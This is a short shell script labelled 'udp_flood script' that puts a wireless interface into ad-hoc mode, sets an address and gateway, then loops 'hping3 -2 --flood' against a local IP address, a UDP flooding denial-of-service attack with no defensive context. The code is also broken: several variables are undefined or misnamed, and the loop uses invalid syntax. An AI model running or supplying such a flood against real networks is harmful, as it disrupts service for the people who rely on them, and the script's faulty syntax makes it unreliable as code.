#udp_flood script

#define variables

interface=<>
access point=00:11:22:33:44:55
ip_add=192.168.2.48
defaultgw=192.168.2.1

#executable names
ifconfig="ifconfig"
iwconfig="iwconfig"
airmon="airmon-ng"
inet="inet"
hping="hping3"
ping="ping"

#associative arrays
declare -A essid

sudo $ifconfig $interface down
sudo $iwconfig $interface mode ad-hoc essid $zephyr channel 6 ap $AP
sudo $ifconfig $interface up $inet $ip_add up
sudo $route add default gw $defaultgw

ping $ip_add

while [1]

sudo $hping -2 --flood $ip_add

end